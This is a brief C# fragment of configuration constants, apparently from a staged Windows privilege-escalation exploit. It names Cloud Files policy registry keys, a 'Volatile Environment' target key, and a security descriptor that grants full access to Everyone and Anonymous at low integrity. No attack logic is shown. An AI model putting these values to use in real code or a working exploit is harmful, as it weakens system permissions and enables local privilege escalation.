        // Configuration constants
        private const string ROOT_KEY = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft";
        private const string CLOUD_FILES = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles";
        private const string BLOCKED_APPS = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles\BlockedApps";
        private const string TARGET_KEY = @"\Registry\User\.DEFAULT\Volatile Environment";
        private const string SECURITY_DESCRIPTOR = "D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)";
        private const int MAX_STAGE = 4;
